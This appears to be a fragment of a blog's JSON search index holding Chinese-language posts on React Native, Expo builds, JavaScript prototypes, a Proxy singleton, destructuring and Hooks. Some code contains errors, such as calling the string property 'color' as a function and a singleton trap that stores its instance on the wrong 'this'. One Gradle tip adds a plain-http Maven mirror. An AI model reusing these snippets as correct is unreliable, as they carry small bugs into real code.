} from './theme-context';\rexport const HomeScreen = ({ navigation }) =\u0026gt; {\rconst themeContext = React.useContext(ThemeContext);\rconst navigateDetails = () =\u0026gt; {\rnavigation.navigate('Details');\r};\rreturn (\r\u0026lt;SafeAreaView style={{ flex: 1 }}\u0026gt;\r\u0026lt;Layout style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}\u0026gt;\r\u0026lt;Button style={{ marginVertical: 4 }} onPress={navigateDetails}\u0026gt;OPEN DETAILS\u0026lt;/Button\u0026gt;\r\u0026lt;Button style={{ marginVertical: 4 }} onPress={themeContext.toggleTheme}\u0026gt;TOGGLE THEME\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r\u0026lt;/SafeAreaView\u0026gt;\r);\r};\r五、注意事项 导入 import 组件一定要用{组件名}包裹住，否则将不能正确解析。\n","description":"","id":27,"section":"react-native","tags":null,"title":"UI-Kitten 基础","uri":"https://danacoding.github.io/react-native/ui/ui-kitten/kitten-base/"},{"content":"一、关键字  对象 object：是数据的集合 原型继承 构造器 原型链 子类继承  JavaScript 中的（几乎）一切都是对象，除了原始值以外（number,string,boolean,undefined,null)\n二、经典继承 vs 原型继承 编程中的继承意味着一个对象基于另一个对象，并且可以访问其他对象的属性和方法。\nJavaScript 使用原型继承，它不像 C 或者 Java 那样的经典继承，这是一个重要的区别。\n   经典继承 原型继承     class prototype   对象实例从 class 继承 对象实例从其他对象继承   子 class 可以从父 class 继承 不从 class 继承（因为 JS 没有 class 的概念，即使是 ES6 的 class，它的底层也是基于 prototype，所以它只是一个类似经典 class 的语法糖）   class 是不可变的，它不能在运行时更改 原型prototype可以在运行时更改   类支持或不支持多重继承（取决于语言） 对象可以从多个原型继承    原型继承   原型继承的定义特征是对象实例可以通过原型链访问继承的属性和方法。\n  这是通过 JavaScript 中的每个对象自动赋予一个原型属性prototype来实现的。\n  当创建继承自父对象的子对象时，子对象可以访问父对象的原型属性prototype。\n  proptotype 属性本身是一个对象，并且因为子对象可以访问其父对象的原型属性，因此子对象可以访问存储在此处(prototype)的任何属性和方法。\n  案例，假设有一个 vehicle（车辆） 对象，在许多其他语言中，Vehicle会被认为是一个class，因为它是创建vehicle（车辆）类型实例的蓝图。\n然而 JavaScript 并没有 class 的概念，取而代之的是一个构造函数（对象），用作创建其他对象的蓝图。\n- - - step1. 构建一个“类” 1 2 3 4 5 6 7 8 9 10  // 使用构造器（构造函数）构建一个`Vehicle（车辆）`类 let Vehicle = function (color, weight, year) { this.color = color; this.weight = weight; this.year = year; this.honk = function () { console.log(\u0026#34;Honk!\u0026#34;); //鸣喇叭  }; };   - - - step2. 实列化一个对象 1 2 3 4  let myVehicle = new Vehicle(\u0026#39;blue\u0026#39;, \u0026#39;500\u0026#39;, 2019);\tmyVehicle.color(); // \u0026#39;blue\u0026#39; myVehicle.honk(); // \u0026#39;Honk!\u0026#39;   - - - step3. 原型 prototype 登场 - 优化 在上例中，因为已经在构造函数体中定义了 honk 方法，\n所以每个新的车辆实例都会有它自己单独的 honk 副本存储在内存中。\n由于 honk 始终是相同的功能，因此每个实例存储自己的唯一副本是没有意义的。\n这就是原型的力量发挥作用的地方。（对象可以访问其父对象的原型属性，因此将 honk 方法存储在 Vehicle 的原型属性中，则所有实例都可以访问它，而无需存储自己的副本。）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  let Vehicle = function (color, weight, year) { this.color = color; this.weight = weight; this.year = year; }; Vehicle.prototype.honk = function () { console.log(\u0026#34;Honk!\u0026#34;); }; let myVehicle = new Vehicle(\u0026#34;blue\u0026#34;, \u0026#34;500\u0026#34;, 2019); myVehicle.honk(); // \u0026#39;Honk!\u0026#39;   三、原型链 __proto__ （链接） 本质上，当调用 honk 方法时，JavaScript 将查看调用对象的属性，在本例中为 myVehicle，用于名为 honk 的方法（或属性）。 如果在对象上找不到此属性，我们将向上移动一级原型链。\n为了建立对象与其原型之间的链接，使用了 myVehicle 的 proto 属性。 这个 proto 属性本质上是指向它的构造函数原型的链接。\n一般而言，实例的 __proto__ 属性是指向它的原型（其构造函数的原型属性）的链接。\n在控制台中演示：\n1 2  myVehicle.__proto__ === Vehicle.prototype // true   因为在原型上显式地存储了 honk 方法，所以，Vehicle 的所有实例都可以访问 honk 方法，而无需存储自己的副本。\n四、子类继承（用原型链模拟）   fn.call()：call方法的作用是调用fn构造函数\n  Object.create()：允许创建一个新对象，同时指定该对象的原型\n  假设我们有一个不同的构造函数，它类似于 Vehicle（车辆） 但更具体，例如 Motorcycle（摩托车） 构造函数。\nMotorcycle（摩托车） 具有与 Vehicle（车辆） 相同的所有属性和功能，但它还具有 engineSize（引擎尺寸） 属性和加油方法。\n因为摩托车与车辆共享相同的属性，所以可以使用继承来简化代码。 通过让 Motorcycle 从 Vehicle 继承，可以避免两次指定共享的属性和方法。\n 注意：类和子类是经典继承的一个特征，而不是原型继承，这意味着Motorcycle实际上不是一个子类。 在 JavaScript 中，使用原型链来模拟类和子类。  1 2 3 4 5 6 7 8 9  let Motorcycle = function (color, weight, year, engineSize) { Vehicle.call(this, color, weight, year); //call方法的作用是调用Vehicle构造函数  this.engineSize = engineSize; }; Motorcycle.prototype = Object.create(Vehicle.prototype) //Object.create方法允许创建一个新对象，同时指定该对象的原型  let myMotorcycle = new Motorcycle(\u0026#34;green\u0026#34;, 150, 2015, 500);   通过这一步，已经连接了原型链。\nMotorcycle.prototype 的 proto 属性将设置为 Vehicle.prototype，摩托车实例现在可以访问摩托车原型以及车辆原型上存储的所有属性和方法。\n为了演示这一点，在 Motorcycles 原型中添加加油方法:\n1 2 3 4 5 6 7  Motorcycle.prototype.refuel = function () { console.log(\u0026#34;Your fuel tank is now full!\u0026#34;); }; myMotorcycle.honk(); // \u0026#39;Honk!\u0026#39; myMotorcycle.refuel(); // \u0026#39;Your fuel tank is now full!\u0026#39;   五、结语 JavaScript 实现面向对象编程的方式与许多其他使用基于class类的语言不同。\n通过掌握原型继承、构造函数和原型链，才可以充分利用语言特性并了解 JavaScript 在底层是如何工作的。\n","description":"JavaScript 的继承和原型链概念","id":28,"section":"jsts","tags":null,"title":"原型链和继承","uri":"https://danacoding.github.io/jsts/prototype/prototype-bp/"},{"content":"单例是一种面向对象的软件设计模式，它确保给定的类只被实例化一次。\n比如，数据库连接。\nProxy Proxy 对象用于创建一个对象的代理，从而实现基本操作的拦截和自定义（如属性查找、赋值、枚举、函数调用等）。\n#. 语法 1 2  new Proxy(target, handler)   #. 术语  handler 包含捕捉器（trap）的占位符对象（处理器对象）。 traps 允许为某些操作（例如属性查找、赋值等）定义自定义行为的方法。这类似于操作系统中捕获器的概念。 target 被 Proxy 代理虚拟化的对象。它常被作为代理的存储后端。根据目标验证关于对象不可扩展性或不可配置属性的不变量（保持不变的语义）。  #. Proxy 有2个参数  target 被代理的对象。它可以是任何类型的对象，包括内置的数组，函数甚至是另一个代理对象。 handler 被代理对象上的自定义行为。它是一个对象，它的属性提供了部分操作时所发生的处理函数。  使用 Proxy 构建单例模式  单例模式规定给定的类只能有一个实例。 这意味着最有用的捕获器（注意：proxy中有多种捕获器）是 handler.construct()。 handler.construct() 方法用于拦截 new 操作符. 为了使new操作符在生成的Proxy对象上生效，用于初始化代理的目标对象自身必须具有[[Construct]]内部方法（即 new target 必须是有效的）。  1 2 3 4 5 6 7 8 9 10 11  const singletonify = (className) =\u0026gt; { return new Proxy(className.prototype.constructor, { instance: null, construct: (target, argumentsList) =\u0026gt; { if (!this.instance) this.instance = new target(...argumentsList); return this.instance; } }); }   使用示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class MyClass { constructor(msg) { this.msg = msg; } printMsg() { console.log(this.msg); } } MySingletonClass = singletonify(MyClass); const myObj = new MySingletonClass(\u0026#39;first\u0026#39;); myObj.printMsg(); // \u0026#39;first\u0026#39; const myObj2 = new MySingletonClass(\u0026#39;second\u0026#39;); myObj2.printMsg(); // \u0026#39;first\u0026#39;   可以看到 第二次 MySingletonClass 被实例化了，但什么都没有发生。\n这是因为一个实例已经存在，所以它被 返回 而不是创建一个新对象。\n","description":"单例是一种面向对象的软件设计模式，它确保给定的类只被实例化一次","id":29,"section":"jsts","tags":null,"title":"在 JavaScript 中实现单例","uri":"https://danacoding.github.io/jsts/function/single/"},{"content":"一、收集需求 第一步也是最重要的一步是收集所有需求。\n我们生活在一个非常复杂的世界中，不同背景的人可以帮助我们填补空白（自己的局限性）。\n因此，应该与可能对其感兴趣的所有人群（利益相关者）讨论该任务。\n需要对期望的结果有最清楚的理解，需要把它写下来：这有助于发现所有的需求和影响。\n举例：\n1. 产品团队：他们知道功能和目标。它们帮助我们了解该功能的快乐路径和商业价值。\r2. 技术团队：他们是系统专家，可以指出陷阱和可能的并发症。他们的经验对于创建估计和定义未知数也很重要。\r3. 设计团队：如果该功能涉及 UI 或 UX 的更改，请务必与团队讨论设计以发现任何可能的问题。\r4. QA团队：质量保证团队是最接近最终用户的团队。他们接受过产品使用培训，擅长尝试各种不愉快的道路。我们可以利用他们的经验来创建一组测试用例来推动开发。\r5. 移动工程师和后端工程师可以在不同的团队中工作并经常协作。如果一个功能需要一个新的端点，那么让后端团队参与是很重要的。他们需要计划和安排一些时间与您的团队合作，他们可以帮助设计一个可以很好扩展的数据流。\r6. 法律/合规和安全团队：当一项功能需要收集一些新数据时，我们必须让法律、合规和安全团队参与，以确保该功能可以开发，服务条款是否必须更新以及如何处理。\r经常与这些团队沟通，召开会议并公开讨论该功能。记下讨论的内容并与团队分享。在进入下一步之前获得他们的支持。\n二、原型制作 在这一步中，一两个人会投入一些时间来探索该技术，并将团队想要开发的内容的概念证明 (POC) 放在一起。\n这里的目标是快速响应：没有​​测试，没有干净的代码，没有错误处理。我们只需要检查是否可行以及可能存在哪些问题。\n原型设计应该有时间限制：时间应该投入最少的时间来回答最有说服力的问题。\n一旦团队有了一些可行的方法，请与利益相关者核对以验证团队是否朝着正确的方向前进。\n然后，我们必须避免一个常见的陷阱：将原型推向生产。原型的开发没有考虑到可扩展性和工程最佳实践。将其推广到生产可能会带来短期收益，但从长远来看，它会产生技术债务和更高的成本。\n三、设计 一旦需求明确并且原型被接受，就是使用UML图表和适当的文档设计适当的解决方案的时候了。\n它允许我们快速绘制类图和序列图，以了解如何组成系统以及它应该如何运行。可以使用绘制 UML 图的工具 - diagrams.net（以前称为 draw.io）\n设计解决方案时无需深入细节。高级设计，组件之间的连接就足够了。当所有团队在设计上进行协作并就实施达成一致时，才能获得最佳结果。\n采用迭代方法很重要。在设计解决方案的特定部分时，利益相关者应该参与进来：他们可以仔细检查他们的要求是否得到尊重。例如，如果安全团队不相信敏感信息的存储方式，团队可以迭代解决方案的那部分，直到每个人都满意。\n此步骤的结果是一份包含解决方案架构的文档，有助于定义评估。它还跟踪时间线上做出的决定。\n四、测试驱动的实现（TDD 区别于 CDD） 在这个阶段，设计被分成更小的任务，分配给不同的团队成员。行业标准是使用测试驱动开发(TDD) 方法实现功能。\nTDD 有几个可以加快整体开发周期的好处：\n1. 处理测试用例（由 QA 团队定义）以确保该功能符合所有要求。 2. 不会添加超过需要的内容（YAGNI原则）。\r3. 编写的代码本质上是可测试的。否则，无法先编写测试。\r4. 不会浪费时间手动测试代码。在移动开发中，手动测试意味着：构建应用程序、启动模拟器、加载应用程序、启动它、导航到正确的屏幕并测试它。此过程可能需要几分钟时间。单元测试需要几毫秒。\r5. 获取一个测试套件，以防止代码回归。\r6. 获取测试代码的文档。\r五、验收和发布 至此，该功能已经开发完成。\n我们需要将其提交给质量保证部门以及产品和设计团队，以查看它是否通过了人工验收标准。\n质量保证团队希望测试最关键的路径和新功能的行为。\n同样，设计和产品团队希望仔细检查用户体验和需求是否符合他们的想法。\n届时，该功能已准备好发布给最终用户。\n六、结语 个人项目也可以遵循此过程。我们应该始终检查功能的预期内容，验证假设，设计适当的解决方案。\n这个过程可以节省大量时间，也可以最大限度地提高人们的幸福感：当他们参与到项目中时，他们会感到被倾听，并且很重要。\n轻松协作，才能为项目的成功生根发芽。而这也是我们所渴望的。\n","description":"开发任何功能的5个步骤","id":30,"section":"others","tags":null,"title":"如何开发功能和解决问题","uri":"https://danacoding.github.io/others/devmethod/devmethod/"},{"content":"1. 忽略值 1 2 3  const [apple, , banana] = [\u0026#39;apple\u0026#39;, \u0026#39;pear\u0026#39;, \u0026#39;banana\u0026#39;]; console.log(apple, banana); // apple banana   2. 分配剩余值 1 2 3 4 5 6  const [one, two, ...remainingNum] = [1, 2, 3, 4, 5]; console.log(remainingNum); // [3, 4, 5]  const { apple, pear, ...remainFruits } = { apple:\u0026#39;apple\u0026#39;, pear:\u0026#39;pear\u0026#39;, banana:\u0026#39;banana\u0026#39;, cherry:\u0026#39;cherry\u0026#39; }; console.log(remainFruits); // { banana:\u0026#39;banana\u0026#39;, cherry:\u0026#39;cherry\u0026#39; }   3. 组合的数组和对象 - 解构 1 2 3  const [, , { name }] = [{id:1, name:\u0026#39;apple\u0026#39;}, {id:2, name:\u0026#39;pear\u0026#39;}, {id:3, name:\u0026#39;banana\u0026#39;}]; console.log(name); // banana   4. 交换数组中的变量 1 2 3  const fruits = [\u0026#39;apple\u0026#39;, \u0026#39;pear\u0026#39;, \u0026#39;banana\u0026#39;]; [fruits[2], fruits[1]] = [fruits[1], fruits[2]];   5. 重命名变量 1 2 3  const { apple, pear, bUNana: banana } = { apple:\u0026#39;apple\u0026#39;, pear:\u0026#39;pear\u0026#39;, bUNana:\u0026#39;banana\u0026#39; }; console.log(banana); // banana   6. 设置默认值 1 2 3 4 5 6  const { banana = \u0026#39;banana\u0026#39;, apple } = { banana:undefined, apple:\u0026#39;apple\u0026#39; }; console.log(banana); // banana  const [one, two, three = 3] = [1, 2, undefined]; console.log(three); // 3   7. 嵌套结构 1 2 3 4 5 6  const { banana, fruitList: [{ apple: nestedApple }] } = { banana: \u0026#39;banana\u0026#39;, fruitList: [{ apple: \u0026#39;apple\u0026#39; }, { pear: \u0026#39;pear\u0026#39; }] }; console.log(nestedApple); // apple   8. 动态对象键 1 2 3 4 5  const fruits = {banana:\u0026#39;banana\u0026#39;, cherry: \u0026#39;cherry\u0026#39;}; const fruitKey = \u0026#39;banana\u0026#39;; const {[fruitKey]:fruitOfChoice} = fruits; console.log(fruitOfChoice); // banana   9. 解构函数参数 1 2 3 4  const getCherry = ({banana, cherry}) =\u0026gt; console.log(cherry); const fruits = {banana: \u0026#39;banana\u0026#39;, cherry: \u0026#39;cherry\u0026#39;}; getCherry(fruits); // cherry   ","description":"强大的JavaScript解构技术","id":32,"section":"jsts","tags":null,"title":"解构赋值","uri":"https://danacoding.github.io/jsts/array/jiegou/"},{"content":"设计模式是软件开发的基本部分，\n因为它们为软件设计中经常出现的问题提供了典型的解决方案。\n设计模式不是提供特定的软件部分，而是可以用来以优化的方式处理重复出现的主题的概念。\n在过去的几年里，Web 开发生态系统发生了迅速的变化。\n虽然一些众所周知的设计模式可能根本不像过去那样有价值，但其他设计模式已经演变为使用最新技术解决现代问题。\nFacebook 的 JavaScript 库 React 在过去 5 年中获得了巨大的吸引力，与Angular、Vue、Ember和Svelte等竞争性 JavaScript 库相比，它是目前NPM 上下载频率最高的框架。\n由于 React 的流行，设计模式已被修改、优化并创建了新的模式，以便在当前的现代 Web 开发生态系统中提供价值。\n最新版本的 React 引入了一个名为Hooks的新功能，它在您的应用程序设计中扮演着非常重要的角色，可以替代许多传统的设计模式。\n现代 Web 开发涉及许多不同类型的模式。\n使用 ES2015+ 的常见设计模式的实现、优点和陷阱、特定于 React 的设计模式及其使用 React Hooks 的可能修改和实现，以及更多有助于改进现代 Web 应用程序的模式和优化！\n","description":"设计模式是软件开发的基本部分，因为它们为软件设计中经常出现的问题提供了典型的解决方案。设计模式不是提供特定的软件部分，而是可以用来以优化的方式处理重复出现的主题的概念。","id":33,"section":"patterns","tags":null,"title":"设计模式介绍","uri":"https://danacoding.github.io/patterns/design-patterns/design-patterns/"},{"content":"一、创建项目 expo init MyProject 创建项目，选择托管工作流的TypeScript的空白模板，然后用 expo eject 退出到裸漏工作流。\n之所以选择这种方式创建项目，是因为灵活性很大，可以在托管和裸漏之间做开发（android\u0026amp;ios/android）。\n因为很多库是依赖裸漏工作流开发的且打包android apk的时候可以减少size，但是同时也可以使用Expo开发的库而节省了手动配置的时间。\n特别注意：在退出之前，必须先expo login登录，否则在构建的时候会报错；在app.json中将基础的配置配置好，比如屏幕方向设置为 ‘default’，背景色设置为 ‘#00000088’ 等。免去之后手动配置的步骤。\nandroid package name 的命名方式：https://developer.android.com/studio/build/application-id\n二、从托管managed工作流中退出到裸漏bare工作流  Step1. 退出\n expo eject\r Step2. 在项目根目录执行下载密钥\n expo fetch:android:keystore\r Step3.将命令行窗口中的密钥复制保存到 temporary_dev_files/build_apk_key 临时文件夹中,便于之后打包apk使用\n 三、查看项目环境信息  Expo/RN项目根目录下可执行以下命令\n react-native info\r Expo项目根目录下也可执行\n expo diagnostics\r四、项目根目录最好新建一个 temporary_dev_files 临时开发文件夹，便于管理许多开发阶段临时存放的文件 五、关于修改node_modules软件包的事宜 有时候安装的软件包不符合自己的要求或者存在bug，需要自己修改软件包源代码，进入到node_modules中找到相关的软件包源码进行修改。\n在不影响开发的情况下，最省事的做法是，将修改好的代码复制一份保存到 temporary_dev_files/modules (注意不要命名为node_modules，因为github不会提交) 临时文件夹，项目会自动读取modules的修改文件。\n六、.d.ts 文件 很多时候，很多库都没有直接安装的TypeScript版本，但是往往带有 index.d.ts 文件。\n可以将它放置到 no_modules/对应的软件包根目录中，就可以生效了，当然，也可在项目根目录新建一个d.ts文件夹，里面可以放置各种库的d.ts文件。\n也可以更省事在项目根目录新建type.d.ts\n或者\n或者（推荐）\n项目根目录新建 type.d.ts\ndeclare module 'react-native-static-server'\rdeclare module 'react-native-fs'\r七、关于expo启动图片不显示和裸漏工作流打包失败的问题 expo sdk40 启动图片不显示，连官方都给不到答案。github issues\n同时，裸漏工作流打包失败。裸漏工作流和托管工作流打包出来的apk都不显示图像。\n问题分析，本地java sdk和托管服务器java sdk没有升级。\n解决办法：\n升级java8到最新版本就可以解决了。\n从8u271 升级到 8u281 。\n裸漏工作流中打包没有问题了，同时apk启动图像也可以显示了。\n至于托管工作流，由于服务器在Expo，要等到他们升级了估计才能正常显示图片。\n八、打包apk的尺寸和性能提升 用裸漏工作流打包要比托管工作流尺寸要小不少，这对于对体积有要求的项目是个选择。\n压缩及优化apk包 \u0026ndash;启用Hermes爱马仕 + 构建不同架构的apk\n图片会对性能有很大的影响（cpu和内存等峰值），建议使用webp格式的图像\n// Step1. android/app/build.gradle\rproject.ext.react = [\rentryFile: \u0026quot;index.js\u0026quot;,\r- enableHermes: false // clean and rebuild if changing\r+ enableHermes: true // clean and rebuild if changing\r]\r- def enableHermes = project.ext.react.get(\u0026quot;enableHermes\u0026quot;, false);\r+ def enableHermes = project.ext.react.get(\u0026quot;enableHermes\u0026quot;, true);\r- def enableSeparateBuildPerCPUArchitecture = false\r+ def enableSeparateBuildPerCPUArchitecture = true\r// Step2. 清理构建\rcd android \u0026amp;\u0026amp; ./gradlew clean\r// Step3. 重新构建\rgradlew assembleRelease\r九、裸漏工作流打包apk后，github上传文件过大 由于打包后的android代码增加了一个.hprof和一个 BasePackageList.java 大文件，所以在上传到github的时候文件超大了，由于expo用expo eject退出到裸漏工作流的时候没有自动生成对.hprof和BasePackageList.java的限制新.gitignore文件，所以要手动自己添加进去。最省事就是去到Expo的github根目录拿现成的来用 https://github.com/expo/expo/blob/master/.gitignore\n十、gradlew clean yarn android 过程中，报Task :app:processDebugResources FAILED 等等错误。\n Step1. android 文件夹中 执行清理构建\n gradlew clean\r Step2. 然后再返回项目根目录 执行\n yarn android\r十一、Could not download groovy-all-2.4.15.jar  由于中国共产党邪教的原因\n * What went wrong:\rCould not determine the dependencies of task ':app:lintVitalRelease'.\r\u0026gt; Could not resolve all artifacts for configuration ':app:debugCompileClasspath'.\r\u0026gt; Could not download groovy-all-2.4.15.jar (org.codehaus.groovy:groovy-all:2.4.15)\r\u0026gt; Could not get resource 'https://jcenter.bintray.com/org/codehaus/groovy/groovy-all/2.4.15/groovy-all-2.4.15.jar'.\r\u0026gt; Could not GET 'https://jcenter.bintray.com/org/codehaus/groovy/groovy-all/2.4.15/groovy-all-2.4.15.jar'.\r\u0026gt; Remote host terminated the handshake\r 解决办法\n  Step1. android/build.gradle\n repositories {\r- google()\r- jcenter()\r//用阿里镜像替换\r+ maven { url 'https://maven.aliyun.com/repository/google'}\r+ maven { url 'https://maven.aliyun.com/repository/jcenter'}\r+ maven { url 'http://maven.aliyun.com/nexus/content/groups/public'}\r}\r Step2. 然后再打包apk\n gradlew assembleRelease\r十二、深层链接 DeepLink + android backbutton 安卓返回键 例子  在 /android/app/src/main/AndroidManifest.xml 中配置 scheme 访问前缀\n \u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026quot;android.intent.action.VIEW\u0026quot;/\u0026gt;\r\u0026lt;category android:name=\u0026quot;android.intent.category.DEFAULT\u0026quot;/\u0026gt;\r\u0026lt;category android:name=\u0026quot;android.intent.category.BROWSABLE\u0026quot;/\u0026gt;\r\u0026lt;data android:scheme=\u0026quot;myapp\u0026quot;/\u0026gt;\r\u0026lt;data android:scheme=\u0026quot;com.notbrent.mofengfs\u0026quot;/\u0026gt;\r\u0026lt;data android:scheme=\u0026quot;a08\u0026quot;/\u0026gt;\r\u0026lt;/intent-filter\u0026gt;\r 配置深层链接\n import * as Linking from 'expo-linking';\rexport default {\rprefixes: ['a08://'],\rconfig: {\rscreens: {\rRoot: {\rscreens: {\rTabOne: {\rscreens: {\rTabOneScreen: 'one',\r},\r},\rTabTwo: {\rscreens: {\rTabTwoScreen: 'two',\r},\r},\r},\r},\r// NotFound: '*',\rList: {\rpath: 'list/:id',\rparse: {\rid: (id: any) =\u0026gt; `${id}`\r}\r},\rDetail: {\rpath: 'detail/:id',\rparse: {\rid: (id: any) =\u0026gt; `${id}`\r}\r}\r}\r},\r};\r NavigationContainer 中调用深层链接\n \u0026lt;NavigationContainer\rlinking={LinkingConfiguration}\rtheme={colorScheme === 'dark' ? DarkTheme : DefaultTheme}\u0026gt;\r\u0026lt;RootNavigator /\u0026gt;\r\u0026lt;/NavigationContainer\u0026gt;\r android backbutton 不能返回上一页的解决办法\n每个非首页屏幕都要添加goBack代码\n import { BackHandler } from 'react-native';\rexport const listScreen = ({ navigation: { goBack } }) =\u0026gt; {\r// 返回上一屏 start\rfunction handleBackButtonClick() {\rgoBack();\rreturn true;\r}\ruseEffect(() =\u0026gt; {\rBackHandler.addEventListener('hardwareBackPress', handleBackButtonClick);\rreturn () =\u0026gt; {\rBackHandler.removeEventListener('hardwareBackPress', handleBackButtonClick);\r};\r}, []);\r// 返回上一屏 end\r...\r...\r 唤醒深层链接，执行例如：\n npx uri-scheme open a08://detail/123 --android\r完整例子：https://github.com/mofengfs/DeepLink-BackHandler-Example\n十三、启动屏幕白闪解决 使用 react navigation v5和 eva 主题， 在 NavigationContainer 中配置深色主题即可\n Step1.\n import { NavigationContainer, DarkTheme, DefaultTheme } from '@react-navigation/native'; import * as eva from '@eva-design/eva';\r Step2.\n const navigationTheme = eva.dark ? DarkTheme : DefaultTheme;\r Step3.\n \u0026lt;NavigationContainer theme={navigationTheme} linking={deepLinking}\u0026gt;\r\u0026lt;MainStack /\u0026gt;\r\u0026lt;/NavigationContainer\u0026gt;\r十四、worker cmd 假死状态 有时候打印没有即时显示，可以尝试敲回车键\n十五、error: Android project not found. Are you sure this is a React Native project? 很可能是丢失了./android/app/src/main/AndroidManifest.xml文件\n十六、Deprecated Gradle features were used in this build, making it incompatible with Gradle 7.0  ./android/build.gradle\n - classpath(\u0026quot;com.android.tools.build:gradle:3.5.3\u0026quot;)\r+ classpath(\u0026quot;com.android.tools.build:gradle:3.5.4\u0026quot;)\r十七、文件更新，标记 任意能持久保存数据的地方/方式都可以做版本标记，总之就是让程序自己知道哪些逻辑执行过了，哪些需要执行，执行完了做标记，不管啥迁移都是这么个流程\n通过拉去服务器返回的版本号与本地数据库保存的版本号做对比，判断是否应该执行文件的更新操作。\n注意：压缩文件必须是能够直接解压不带根文件夹名称，压缩的时候需要注意，操作如下： 全选添加到 www.zip 操作\n十八、UI方向 默认UI横向。 只要进入了项目，就可以随意更改方向了。\n有关如何控制应用程序方向的信息，请参见app.json中的方向键\n有效值：自响应default，纵向portrait，横向landscape\nApp.json中配置\n{\r\u0026quot;expo\u0026quot;: {\r\u0026quot;name\u0026quot;: \u0026quot;my-app\u0026quot;,\r\u0026quot;slug\u0026quot;: \u0026quot;my-app\u0026quot;,\r\u0026quot;version\u0026quot;: \u0026quot;1.0.0\u0026quot;,\r- \u0026quot;orientation\u0026quot;: \u0026quot;portrait\u0026quot;,//纵向\r+ \u0026quot;orientation\u0026quot;: \u0026quot;default\u0026quot;,//自响应\r\u0026quot;icon\u0026quot;: \u0026quot;./assets/icon.png\u0026quot;,\r\u0026quot;splash\u0026quot;: {\r\u0026quot;image\u0026quot;: \u0026quot;./assets/splash.png\u0026quot;,\r\u0026quot;resizeMode\u0026quot;: \u0026quot;contain\u0026quot;,\r\u0026quot;backgroundColor\u0026quot;: \u0026quot;#ffffff\u0026quot;\r},\r\u0026quot;updates\u0026quot;: {\r\u0026quot;fallbackToCacheTimeout\u0026quot;: 0\r},\r\u0026quot;assetBundlePatterns\u0026quot;: [\r\u0026quot;**/*\u0026quot;\r],\r\u0026quot;ios\u0026quot;: {\r\u0026quot;supportsTablet\u0026quot;: true\r},\r\u0026quot;android\u0026quot;: {\r\u0026quot;adaptiveIcon\u0026quot;: {\r\u0026quot;foregroundImage\u0026quot;: \u0026quot;./assets/adaptive-icon.png\u0026quot;,\r\u0026quot;backgroundColor\u0026quot;: \u0026quot;#FFFFFF\u0026quot;\r}\r},\r\u0026quot;web\u0026quot;: {\r\u0026quot;favicon\u0026quot;: \u0026quot;./assets/favicon.png\u0026quot;\r}\r}\r}\r十九、Expo\u0026amp;UI-Kitten（web端报错的问题） 解决办法：\n//1.安装\rexpo install @expo/webpack-config\r//2.根目录新建`webpack.config.js`添加\rconst createExpoWebpackConfigAsync = require('@expo/webpack-config');\rmodule.exports = async function(env, argv) {\rconst config = await createExpoWebpackConfigAsync({\r...env,\rbabel: {\rdangerouslyAddModulePathsToTranspile: ['@ui-kitten/components']\r}\r}, argv);\rreturn config;\r};\r二十、Expo Web 项目抽屉   轮播图适合用的不多，react-native-banner-carousel 是其中一个\n  react-native-webview 不支持web端渲染html，替代方案是使用 react-native-web-webview\n  在线客服\n  function Link(props: any) {\rreturn (\r\u0026lt;Text\r{...props}\raccessibilityRole=\u0026quot;link\u0026quot;\rstyle={StyleSheet.compose(styles.link, props.style)}\r/\u0026gt;\r);\r}\r\u0026lt;Link href=\u0026quot;http://wpa.qq.com/msgrd?v=3\u0026amp;uin=QQ号\u0026amp;site=qq\u0026amp;menu=yes\u0026quot; style={styles.item}\u0026gt;\r\u0026lt;TouchableOpacity style={styles.link}\u0026gt;\r\u0026lt;FontAwesome5 name=\u0026quot;comments\u0026quot; size={24} color=\u0026quot;#1296db\u0026quot; /\u0026gt;\r\u0026lt;Text style={styles.item_text}\u0026gt;在线客服\u0026lt;/Text\u0026gt;\r\u0026lt;/TouchableOpacity\u0026gt;\r\u0026lt;/Link\u0026gt;\r 模态框使用 react-native-modalize\n  由于expo build:web 构建的是单页面应用，所以，在刷新页面的时候会找不到路由对应的文件，所以，最便捷的方式是通过npx serve \u0026ndash;single启动服务，通过云服务配置对应的端口号，比如配置5000， 那么npx serve \u0026ndash;single启动的服务也应该是5000， IIS配置的端口号随便了，只要不与5000或者其他端口冲突就行了。\n   除了5000端口号，还可通过以下命令自定义端口号(基于Vercel服务库)\n npx serve --single -l 1337\r//or\rnpx serve --single --listen 1337\r","description":"","id":34,"section":"react-native","tags":null,"title":"Expo 最佳实践","uri":"https://danacoding.github.io/react-native/expo/expo-bp/"},{"content":"Hook 是 React 16.8 的新增特性。它可以让你在不编写 class 的情况下使用 state 以及其他的 React 特性。\nHook 是一些可以让你在函数组件里“钩入” React state 及生命周期等特性的函数。\nHook 使你在无需修改组件结构的情况下复用状态逻辑。 这使得在组件间或社区内共享 Hook 变得更便捷。\nHook 将组件中相互关联的部分拆分成更小的函数（比如设置订阅或请求数据），而并非强制按照生命周期划分。你还可以使用 reducer 来管理组件的内部状态，使其更加可预测。\n什么时候我会用 Hook？ 如果你在编写函数组件并意识到需要向其添加一些 state，以前的做法是必须将其转化为 class。现在你可以在现有的函数组件中使用 Hook。\n一、Hooks 底层原理 React 是如何把对 Hook 的调用和组件联系起来的？\nReact 保持对当前渲染中的组件的追踪。多亏了 Hook 规范，我们得知 Hook 只会在 React 组件中被调用（或自定义 Hook —— 同样只会在 React 组件中被调用）。\n每个组件内部都有一个「记忆单元格」列表。它们只不过是我们用来存储一些数据的 JavaScript 对象。\n当你用 useState() 调用一个 Hook 的时候，它会读取当前的单元格（或在首次渲染时将其初始化），然后把指针移动到下一个。\n这就是多个 useState() 调用会得到各自独立的本地 state 的原因。\n二、Hooks 规范 1. 只在最顶层使用 Hook 不要在循环，条件或嵌套函数中调用 Hook ,确保总是在你的 React 函数的最顶层以及任何 return 之前调用他们。遵守这条规则，你就能确保 Hook 在每一次渲染中都按照同样的顺序被调用。 示例：\nfunction Form() {\r// 1. 使用`name state`变量\rconst [name, setName] = useState('Mary');\r// 2. 使用 `effect` 来持久化表单\ruseEffect(function persistForm() {\rlocalStorage.setItem('formData', name);\r});\r// 3. 使用 `surname` 状态变量\rconst [surname, setSurname] = useState('Poppins');\r// 4. 使用 `effect` 来更新标题\ruseEffect(function updateTitle() {\rdocument.title = name + ' ' + surname;\r});\r// 